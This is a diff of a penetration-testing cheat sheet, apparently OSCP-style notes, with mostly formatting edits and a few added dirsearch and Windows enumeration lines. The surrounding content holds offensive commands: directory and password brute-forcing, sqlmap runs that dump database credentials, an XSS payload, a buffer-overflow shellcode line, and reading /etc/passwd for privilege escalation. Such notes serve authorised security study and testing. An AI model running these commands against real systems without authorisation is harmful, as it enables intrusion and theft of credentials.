@@ -581,16 +581,15 @@ wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/common.txt --hc 404 http://10
 # GoBuster
 gobuster dir -u http://10.11.1.111 -w /usr/share/seclists/Discovery/Web_Content/common.txt -s '200,204,301,302,307,403,500' -e
 gobuster dir -e -u http://10.11.1.111/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
-gobuster dir -u http://$10.11.1.111 -w /usr/share/seclists/Discovery/Web_Content/Top1000-RobotsDisallowed.txt
 gobuster dir -e -u http://10.11.1.111/ -w /usr/share/wordlists/dirb/common.txt
 
 dotdotpwn.pl -m http -h 10.11.1.111 -M GET -o unix
 
 ./dirsearch.py -u 10.10.10.157 -e php
+./dirsearch.py –u http://192.18.1.5/dvwa -e php -f -x 400,403,404
 
 medusa -h 10.11.1.111 -u admin -P wordlist.txt -M http -m DIR:/test -T 10
 ```
-
 
 ### Default/Weak login
 
@@ -615,9 +614,7 @@ root <servicename>
 username <servicename>
 ```
 
-
 ### LFI/RFI
-
 
 ```
 fimap -u "http://10.11.1.111/example.php?test="
@@ -662,8 +659,6 @@ cat php_cmd.php
 
 ```
 
-
-
 ### SQL-Injection
 
 ```
@@ -689,7 +684,9 @@ sqlmap -u 'http://admin.cronos.htb/index.php' --forms --dbms=MySQL --risk=3 --le
 
 sqlmap -o -u "http://10.11.1.111:1337/978345210/index.php" --data="username=admin&password=pass&submit=+Login+" --method=POST --level=3 --threads=10 --dbms=MySQL --users --passwords
 ```
+
 ### XSS
+
 ```
 <script>alert("XSS")</script>
 ```
@@ -796,7 +793,6 @@ buffer="A"*2606 + "\x8f\x35\x4a\x5f" + "\x90" * 8 + shellcode
 
 
 ```
-
 
 
 ```
@@ -1014,7 +1010,6 @@ cat /etc/hosts
 grep -vE "nologin" /etc/passwd
 
 # Priv Enumeration Scripts
-upload /unix-privesc-check
 upload /root/Desktop/Backup/Tools/Linux_privesc_tools/linuxprivchecker.py ./
 upload /root/Desktop/Backup/Tools/Linux_privesc_tools/LinEnum.sh ./
 
@@ -1055,6 +1050,12 @@ ps aux
 /home
 /var/
 /usr/src/
+
+# Windows
+systeminfo
+set pro
+Get-WindowsFeature | Where-Object {$_. installstate -eq "installed"} | Format-List Name,Installstate | more
+Get-WindowsFeature | Where-Object {($_.InstallState -eq “installed”) -and ($_.FeatureType -eq “feature”)} | select name,InstallState,FeatureType
 
 # Debian
 dpkg -l
